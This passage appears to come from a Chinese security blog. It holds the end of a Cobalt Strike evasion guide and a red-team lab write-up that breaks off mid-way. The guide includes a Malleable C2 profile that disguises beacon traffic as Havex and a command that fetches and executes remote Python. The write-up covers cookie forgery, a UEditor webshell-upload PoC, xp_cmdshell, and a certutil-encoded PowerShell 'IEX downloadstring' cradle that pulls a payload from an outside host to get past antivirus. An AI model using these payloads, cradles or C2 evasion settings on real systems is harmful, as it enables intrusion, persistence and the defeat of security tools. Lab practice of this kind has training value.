class="code"><pre><span class="line">-alias          指定别名</span><br><span class="line">-storepass      指定更改密钥库的存储口令</span><br><span class="line">-keypass pass   指定更改条目的密钥口令</span><br><span class="line">-keyalg         指定算法</span><br><span class="line">-dname          指定所有者信息</span><br></pre></td></tr></table></figure><p>查看新证书</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1633593719/4_bhiuy0.png"></p><p><strong>编辑 teamserver 文件生成证书</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># generate a certificate  </span><br><span class="line"># naturally you&#x27;re welcome to replace this step with your own permanent certificate.  </span><br><span class="line"># just make sure you pass -Djavax.net.ssl.keyStore=&quot;/path/to/whatever&quot; and  </span><br><span class="line"># -Djavax.net.ssl.keyStorePassword=&quot;password&quot; to java. This is used for setting up  </span><br><span class="line"># an SSL server socket. Also, the SHA-1 digest of the first certificate in the store  </span><br><span class="line"># is printed so users may have a chance to verify they&#x27;re not being owned.</span><br><span class="line">if [ -e ./cobaltstrike.store ]; then  </span><br><span class="line">print_info &quot;Will use existing X509 certificate and keystore (for SSL)&quot;</span><br><span class="line">else  </span><br><span class="line">print_info &quot;Generating X509 certificate and keystore (for SSL)&quot;  keytool -keystore ./cobaltstrike.store -storepass QAXNB   -keypass QAXNB -genkey -keyalg RSA -alias cobaltstrike   -dname &quot;CN=www.qianxin.com, OU=北京奇安信科技有限公司, O=运维部, L=北京, S=北京, C=CN&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h2 id="Malleable-C2-Profiles"><a href="#Malleable-C2-Profiles" class="headerlink" title="Malleable-C2-Profiles"></a>Malleable-C2-Profiles</h2><p>很多 WAF 都能检测出 CS 的流量特征，然而，CS 的流量由 Malleable C2 配置来掌控的，所以我们需要定向去配置这个 Malleable-C2 的 havex.profile 文件</p><p>Beacon 与 teamserver 端 c2 的通信逻辑</p><p>1、stager 的 beacon 会先下载完整的 payload 执行。</p><p>2、beacon 进入睡眠状态，结束睡眠状态后用 http-get 方式发送一个 metadata (具体发送细节可以在 malleable_profie 文件里的 http-get 模块进行自定义),metadata 内容是将目标系统的版本，当前用户等信息给 teamserver 端。</p><p>3、如果存在待执行的任务，则 teamserver 上的 c2 会响应这个 metadata 发布命令。beacon 将会收到具体会话内容与一个任务 id。</p><p>4、执行完毕后 beacon 将回显数据与任务 id 用 post 方式发送回 teamserver 端的 C2 (细节可以在 malleable_profile 文件中的 http-post 部分进行自定义)，然后又会回到睡眠状态。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/rsmudge/Malleable-C2-Profiles.git  #下载havex.profile文件</span><br></pre></td></tr></table></figure><p>CS 中集成了一个包含在 Linux 平台下的 C2lint 工具，可以检查 havex.profile 代码是否有问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./c2lint ./Malleable-C2-Profiles/APT/havex.profile</span><br></pre></td></tr></table></figure><p>因为 0.0.0.0 是 Cobalt Strike DNS Beacon 特征，可以在 havex.profile 内加一段 set dns_idle “8.8.8.8”; 之后 profile 内默认</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"># havex trojan C&amp;C profile</span><br><span class="line"># Actor: Energetic Bear / Crouching Yeti / Dragonfly</span><br><span class="line"># </span><br><span class="line"># See:</span><br><span class="line"># . http://www.symantec.com/connect/blogs/emerging-threat-dragonfly-energetic-bear-apt-group</span><br><span class="line"># . https://securelist.com/files/2014/07/EB-YetiJuly2014-Public.pdf</span><br><span class="line"># . http://pastebin.com/qCdMwtZ6</span><br><span class="line"># . http://www.crowdstrike.com/sites/all/themes/crowdstrike2/css/imgs/platform/CrowdStrike_Global_Threat_Report_2013.pdf</span><br><span class="line"># . https://github.com/Yara-Rules/rules/blob/master/malware/RAT_Havex.yar</span><br><span class="line"># . http://web.archive.org/web/20170808180137/www.f-secure.com/weblog/archives/00002718.html</span><br><span class="line"># . https://www.virustotal.com/#/file/3d3daee1a38e67707921b222f1685d5bd6328af2fc80d4c11d92dc6a6c289261/details</span><br><span class="line">#</span><br><span class="line"># Author: @armitagehacker</span><br><span class="line"></span><br><span class="line">set sample_name &quot;奇安信&quot;;</span><br><span class="line"></span><br><span class="line">set dns_idle &quot;8.8.8.8&quot;;</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;30000&quot;;</span><br><span class="line"></span><br><span class="line">set useragent &quot;Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2) Java/1.5.0_08&quot;;</span><br><span class="line"></span><br><span class="line">set pipename &quot;mypipe-f##&quot;;</span><br><span class="line">set pipename_stager &quot;mypipe-h##&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https-certificate &#123;</span><br><span class="line">    set keystore &quot;cobaltstrike.store&quot;;</span><br><span class="line">    set password &quot;Mannix123456&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Clone some header values (Sample from: https://malshare.com/sample.php?action=detail&amp;hash=c6e161a948f4474849d5740b2f27964a)</span><br><span class="line"># ./peclone c6e161a948f4474849d5740b2f27964a</span><br><span class="line">stage &#123;</span><br><span class="line">set checksum       &quot;0&quot;;</span><br><span class="line">set entry_point    &quot;134733&quot;;</span><br><span class="line">set image_size_x86 &quot;348160&quot;;</span><br><span class="line">set image_size_x64 &quot;348160&quot;;</span><br><span class="line">set name           &quot;Tmprovider.dll&quot;;</span><br><span class="line">set rich_header    &quot;\x63\x02\x25\x0f\x27\x63\x4b\x5c\x27\x63\x4b\x5c\x27\x63\x4b\x5c\x9a\x2c\xdd\x5c\x24\x63\x4b\x5c\x2e\x1b\xde\x5c\x3b\x63\x4b\x5c\x2e\x1b\xcf\x5c\x1b\x63\x4b\x5c\x2e\x1b\xc8\x5c\x8f\x63\x4b\x5c\x00\xa5\x30\x5c\x28\x63\x4b\x5c\x27\x63\x4a\x5c\x97\x63\x4b\x5c\x2e\x1b\xc1\x5c\x60\x63\x4b\x5c\x2e\x1b\xd9\x5c\x26\x63\x4b\x5c\x39\x31\xdf\x5c\x26\x63\x4b\x5c\x2e\x1b\xda\x5c\x26\x63\x4b\x5c\x52\x69\x63\x68\x27\x63\x4b\x5c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;;</span><br><span class="line"></span><br><span class="line"># disable this little obfuscation</span><br><span class="line">set stomppe        &quot;false&quot;;</span><br><span class="line"></span><br><span class="line"># make these things havex-ish</span><br><span class="line">transform-x86 &#123;</span><br><span class="line">strrep &quot;ReflectiveLoader&quot; &quot;RunDllEntry&quot;;</span><br><span class="line">strrep &quot;beacon.dll&quot;       &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">transform-x64 &#123;</span><br><span class="line">strrep &quot;ReflectiveLoader&quot; &quot;RunDllEntry&quot;;</span><br><span class="line">strrep &quot;beacon.x64.dll&quot;   &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># strings gathered from Yara rules and sandbox string dumps</span><br><span class="line">stringw &quot;%s &lt;%s&gt; (Type=%i, Access=%i, ID=&#x27;%s&#x27;)&quot;;</span><br><span class="line">stringw &quot;%02i was terminated by ThreadManager(2)\n&quot;;</span><br><span class="line">stringw &quot;main sort initialise ...\n&quot;;</span><br><span class="line">stringw &quot;qsort [0x%x, 0x%x] done %d this %d\n&quot;;</span><br><span class="line">stringw &quot;&#123;0x%08x, 0x%08x&#125;&quot;;</span><br><span class="line">stringw &quot;Programm was started at %02i:%02i:%02i\n&quot;;</span><br><span class="line">stringw &quot;a+&quot;;</span><br><span class="line">stringw &quot;%02i:%02i:%02i.%04i:&quot;;</span><br><span class="line">stringw &quot;**************************************************************************\n&quot;;</span><br><span class="line">stringw &quot;Start finging of LAN hosts...\n&quot;;</span><br><span class="line">stringw &quot;Finding was fault. Unexpective error\n&quot;;</span><br><span class="line">stringw &quot;Hosts was&#x27;t found.\n&quot;;</span><br><span class="line">stringw &quot;\t\t\t\t\t%O2i) [%s]\n&quot;;</span><br><span class="line">stringw &quot;Start finging of OPC Servers...&quot;;</span><br><span class="line">stringw &quot;Was found %i OPC Servers.&quot;;</span><br><span class="line">stringw &quot;\t\t%i) [%s\\%s]\n\t\t\tCLSID:          %s\n&quot;;</span><br><span class="line">stringw &quot;\t\t\tUserType:        %s\n\t\t\tVerIndProgID:    %s\n&quot;;</span><br><span class="line">stringw &quot;OPC Servers not found. Programm finished&quot;;</span><br><span class="line">stringw &quot;Start finging of OPC Tags...&quot;;</span><br><span class="line">stringw &quot;[-]Threads number &gt; Hosts number&quot;;</span><br><span class="line">stringw &quot;[-]Can not get local ip&quot;;</span><br><span class="line">stringw &quot;[!]Start&quot;;</span><br><span class="line">stringw &quot;[+]Get WSADATA&quot;;</span><br><span class="line">stringw &quot;[+]Local:&quot;; </span><br><span class="line">stringw &quot;[-]Connection error&quot;;</span><br><span class="line">stringw &quot;Was found %i hosts in LAN:&quot;;</span><br><span class="line">stringw &quot;%s[%s]!!!EXEPTION %i!!!&quot;;</span><br><span class="line">stringw &quot;final combined CRC = 0x%08x&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line">set uri &quot;/include/template/isx.php /wp06/wp-includes/po.php /wp08/wp-includes/dtcla.php&quot;;</span><br><span class="line"></span><br><span class="line">client &#123;</span><br><span class="line">header &quot;Referer&quot; &quot;http://www.google.com&quot;;</span><br><span class="line">header &quot;Accept&quot; &quot;text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5&quot;;</span><br><span class="line">header &quot;Accept-Language&quot; &quot;en-us,en;q=0.5&quot;;</span><br><span class="line"></span><br><span class="line"># base64 encoded Cookie is not a havex indicator, but a place to stuff our data</span><br><span class="line">metadata &#123;</span><br><span class="line">base64;</span><br><span class="line">header &quot;Cookie&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">header &quot;Server&quot; &quot;Apache/2.2.26 (Unix)&quot;;</span><br><span class="line">header &quot;X-Powered-By&quot; &quot;PHP/5.3.28&quot;;</span><br><span class="line">header &quot;Cache-Control&quot; &quot;no-cache&quot;;</span><br><span class="line">header &quot;Content-Type&quot; &quot;text/html&quot;;</span><br><span class="line">header &quot;Keep-Alive&quot; &quot;timeout=3, max=100&quot;;</span><br><span class="line"></span><br><span class="line">output &#123;</span><br><span class="line">base64;</span><br><span class="line">prepend &quot;&lt;html&gt;&lt;head&gt;&lt;mega http-equiv=&#x27;CACHE-CONTROL&#x27; content=&#x27;NO-CACHE&#x27;&gt;&lt;/head&gt;&lt;body&gt;Sorry, no data corresponding your request.&lt;!--havex&quot;;</span><br><span class="line">append &quot;havex--&gt;&lt;/body&gt;&lt;/html&gt;&quot;;</span><br><span class="line">print;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># define indicators for an HTTP POST</span><br><span class="line">http-post &#123;</span><br><span class="line">set uri &quot;/modules/mod_search.php /blog/wp-includes/pomo/src.php /includes/phpmailer/class.pop3.php&quot;;</span><br><span class="line"></span><br><span class="line">client &#123;</span><br><span class="line">header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;</span><br><span class="line"></span><br><span class="line"># transmit our sess id as /whatever.php?id=[identifier]</span><br><span class="line">id &#123;</span><br><span class="line">parameter &quot;id&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># post our output with no real changes</span><br><span class="line">output &#123;</span><br><span class="line">print;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># The server&#x27;s response to our HTTP POST</span><br><span class="line">server &#123;</span><br><span class="line">header &quot;Server&quot; &quot;Apache/2.2.26 (Unix)&quot;;</span><br><span class="line">header &quot;X-Powered-By&quot; &quot;PHP/5.3.28&quot;;</span><br><span class="line">header &quot;Cache-Control&quot; &quot;no-cache&quot;;</span><br><span class="line">header &quot;Content-Type&quot; &quot;text/html&quot;;</span><br><span class="line">header &quot;Keep-Alive&quot; &quot;timeout=3, max=100&quot;;</span><br><span class="line"></span><br><span class="line"># this will just print an empty string, meh...</span><br><span class="line">output &#123;</span><br><span class="line">prepend &quot;blah blah blah&quot;;</span><br><span class="line">mask;</span><br><span class="line">base64;</span><br><span class="line">prepend &quot;&lt;html&gt;&lt;head&gt;&lt;mega http-equiv=&#x27;CACHE-CONTROL&#x27; content=&#x27;NO-CACHE&#x27;&gt;&lt;/head&gt;&lt;body&gt;Sorry, no data corresponding your request.&lt;!--havex&quot;;</span><br><span class="line">append &quot;havex--&gt;&lt;/body&gt;&lt;/html&gt;&quot;;</span><br><span class="line">print;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="批量上线"><a href="#批量上线" class="headerlink" title="批量上线"></a>批量上线</h2><p>伪造 CobaltStrike 的上线信息，原理是在 CobaltStrike teamserver 的默认配置下可以识别出 beacon 信息，基于该信息就可以伪造 CobaltStrike 的上线信息了</p><p>一般来说，没有做特别防护的 teamserver，使用了 stager 功能都会受到这个工具的影响。stager 功能即分段 shellcode，换句话说，使用了 cs 的 shellcode 都会受此影响</p><h3 id="Cobalt-Strike-上线器"><a href="#Cobalt-Strike-上线器" class="headerlink" title="Cobalt Strike 上线器"></a>Cobalt Strike 上线器</h3><p>Cobalt Strike Spam CS 上线器在线版 - Hacking8 安全信息流</p><p>仅支持 CS 设置了 HTTP&#x2F;HTTPS 监听器的情况，仅需要输入 teamserver 的地址或者通过内存分析出 cs beacon 信息，即可一键上线。</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1633594882/4_acrqj7.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#在命令终端执行以下代码即可(需要python3环境)</span><br><span class="line">python3 -c &quot;exec(__import__(&#x27;urllib.request&#x27;,fromlist=&#x27;Hacking8 CobaltSpam&#x27;).urlopen(&#x27;https://i.hacking8.com/cobaltspam?py=1&#x27;).read().decode())&quot; -u http://192.168.1.1:2052 -r 10</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1633595083/4_x7lomr.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1633594929/4_piq6nk.png"></p><p>wireshark 抓包查看数据包特征</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1633595127/4_vgdzh9.png"></p><p>TCP 数据包乱码</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1633595150/4_bopvck.png"></p><p>注：以上部分内容取自利刃信安</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>暗月2021年九月考核项目靶场 - Ack123 NASA WriteUp</title>
      <link href="/posts/400502091/"/>
      <url>/posts/400502091/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>此靶场为暗月师傅的 2021 年 9 月的红队考核靶场 ack123</p><h2 id="主要考点"><a href="#主要考点" class="headerlink" title="主要考点"></a>主要考点</h2><ol><li>站库分离外网打点</li><li>过 360 全家桶</li><li>过 windwos defender</li><li>过火绒</li><li>内网漫游</li><li>多层内网渗透</li><li>横向渗透</li><li>jwt token 密钥破解</li><li>权限提升</li><li>域内渗透</li></ol><h2 id="靶场拓扑图"><a href="#靶场拓扑图" class="headerlink" title="靶场拓扑图"></a>靶场拓扑图</h2><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1633588914/Xnip2021-10-07_14-41-22_pu4v9r.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>打开网站发现是 hdhcms（好得很 cms） 搭建的</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635836591/Xnip2021-11-02_15-01-34_e28zpr.png"></p><p>随手一个 admin 目录打上去就发现了 cms 后台</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635837209/Xnip2021-11-02_15-09-38_ttarms.png"></p><p>注册一个账号进去看看，发现普通账户功能相当少，得想办法搞到管理员权限</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635837213/Xnip2021-11-02_15-12-20_pst9h4.png"></p><h2 id="伪造-cookie-以管理员身份登录后台"><a href="#伪造-cookie-以管理员身份登录后台" class="headerlink" title="伪造 cookie 以管理员身份登录后台"></a>伪造 cookie 以管理员身份登录后台</h2><p>回到后台登录处，抓包分析</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635841276/Xnip2021-11-02_16-03-07_y67o6g.png"></p><p>这个 admincook 可能是鉴权参数，修改 cookie 为 admincook&#x3D;adminuser&#x3D;admin 即可以管理员身份进入后台</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635841402/Xnip2021-11-02_16-23-07_qetlkn.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635841544/Xnip2021-11-02_16-25-33_dwrhk6.png"></p><p>发现这个 cms 有富文本编辑器：百度 Ueditor 1.4.3，想起来这玩意好像是有漏洞的</p><p>需要构造一个上传 shell 的页面</p><p>网上的 poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage&quot; enctype=&quot;application/x-www-form-urlencoded&quot;  method=&quot;POST&quot;&gt;  &lt;p&gt;shell addr: &lt;input type=&quot;text&quot; name=&quot;source[]&quot; /&gt;&lt;/p &gt;  &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>发现这个 cms 有富文本编辑器：百度 Ueditor 1.4.3，想起来这玩意好像是有漏洞的</p><p>需要构造一个上传 shell 的页面</p><p>网上的 poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage&quot; enctype=&quot;application/x-www-form-urlencoded&quot;  method=&quot;POST&quot;&gt;  &lt;p&gt;shell addr: &lt;input type=&quot;text&quot; name=&quot;source[]&quot; /&gt;&lt;/p &gt;  &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>poc 中的 action 路径需要修改一下，这里直接盲猜了一波，结果一发入魂，返回 {“state”:” 参数错误：没有指定抓取源”} 也说明这个版本有漏洞。</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635846569/Xnip2021-11-02_17-48-42_jp60me.png"></p><p>修改后的 poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://www.ackmoon.com/admin/net/controller.ashx?action=catchimage&quot; enctype=&quot;application/x-www-form-urlencoded&quot;  method=&quot;POST&quot;&gt;  &lt;p&gt;shell addr: &lt;input type=&quot;text&quot; name=&quot;source[]&quot; /&gt;&lt;/p &gt;  &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure><h2 id="后台模版处-getshell"><a href="#后台模版处-getshell" class="headerlink" title="后台模版处 getshell"></a>后台模版处 getshell</h2><p>后台模版处可以部署我们的 poc 来构造一个远程下载 webshell 的页面</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635846859/Xnip2021-11-02_17-53-03_aiv4iw.png"></p><p>在模版首页可以知道模版文件的路径</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635846948/Xnip2021-11-02_17-54-03_zvofde.png"></p><p>访问一下我们的 shell.html</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635847080/Xnip2021-11-02_17-56-42_wsur8r.png"></p><p>制作一个以.jpg.aspx 为后缀的图片马放在远程服务器上，这里就不细说了，网上一大堆教程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1/2.jpg.aspx</span><br></pre></td></tr></table></figure><p>远程下载我们的图片马</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635847614/Xnip2021-11-02_18-04-07_vruqh8.png"></p><p>成功后会返回 webshell 路径</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635847666/Xnip2021-11-02_18-04-36_arhrxo.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/upfiles/image/20211102/6377147304762855064957505.aspx</span><br></pre></td></tr></table></figure><p>访问一下 webshell，虽然页面报错，但是可以连接</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635847723/Xnip2021-11-02_18-06-23_opqijj.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635847754/Xnip2021-11-02_18-09-04_msem1j.png"></p><h2 id="WEB1-Bypass-杀软上线-cs"><a href="#WEB1-Bypass-杀软上线-cs" class="headerlink" title="WEB1 Bypass 杀软上线 cs"></a>WEB1 Bypass 杀软上线 cs</h2><p>查了一下进程，发现有 360 全家桶还有护卫神，而且当前权限是 iis 的权限，权限比较低</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc </span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635848372/Xnip2021-11-02_18-13-31_ab99zn.png"></p><p>上传个哥斯拉的马，哥斯拉直接土豆提权绕过 AV 上线 cs</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635848430/Xnip2021-11-02_18-19-15_dw6wmj.png"></p><p>返回 system 权限会话</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635851748/Xnip2021-11-02_19-14-13_ycxn8z.png"></p><h2 id="WEB1-内网信息收集"><a href="#WEB1-内网信息收集" class="headerlink" title="WEB1 内网信息收集"></a>WEB1 内网信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure><p>发现另外一个网段</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635853652/Xnip2021-11-02_19-47-04_vkuuqa.png"></p><p>使用 cs 自带的工具扫一下存活和端口，发现只有两台主机、192.168.183.134 是本机、还有一台 192.168.183.135 开了 1433 端口</p><p>推测是站库分离、在 192.168.183.134 这台找到了数据库配置文件，直接是 sa 权限</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635854645/Xnip2021-11-02_20-03-22_omydrr.png"></p><p>掏出大马直接淦</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635855931/Xnip2021-11-02_20-08-22_ze0lc0.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635855938/Xnip2021-11-02_20-08-57_kv2vap.png"></p><p>查一下有无杀软</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exec master.dbo.xp_cmdshell &#x27;tasklist /svc&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635856164/Xnip2021-11-02_20-28-24_fpskcw.png"></p><p>发现存在火绒安全软件</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635856166/Xnip2021-11-02_20-28-34_gpfw2r.png"></p><h2 id="DATA1-Bypass-火绒上线-cs"><a href="#DATA1-Bypass-火绒上线-cs" class="headerlink" title="DATA1 Bypass 火绒上线 cs"></a>DATA1 Bypass 火绒上线 cs</h2><p>这里我用 certutil 将 payload 编码 echo 到目标主机执行，唯一不好就是会弹窗，后续再改进</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c echo IEX ((new-object net.webclient).downloadstring(&#x27;http://1.1.1.1&#x27;)) | powershell -  #payload</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CertUtil -encode payload.txt payload1.txt</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635857571/Xnip2021-11-02_20-37-21_e6o0yb.png"></p><p>找到一个可写目录然后 echo 到目标主机中</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635857610/Xnip2021-11-02_20-45-48_vglenb.png"></p><p>在目标主机解码运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CertUtil -decode c:\360Downloads\shell.txt c:\360Downloads\shell.bat</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635857650/Xnip2021-11-02_20-47-45_edkdbh.png"></p><p>上线是 mssql 数据库权限，烂土豆提权至 system 权限</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635857689/Xnip2021-11-02_20-49-31_bmqfbz.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635857688/Xnip2021-11-02_20-52-22_bghquk.png"></p><p>跑一下账户明文密码</p><p><img 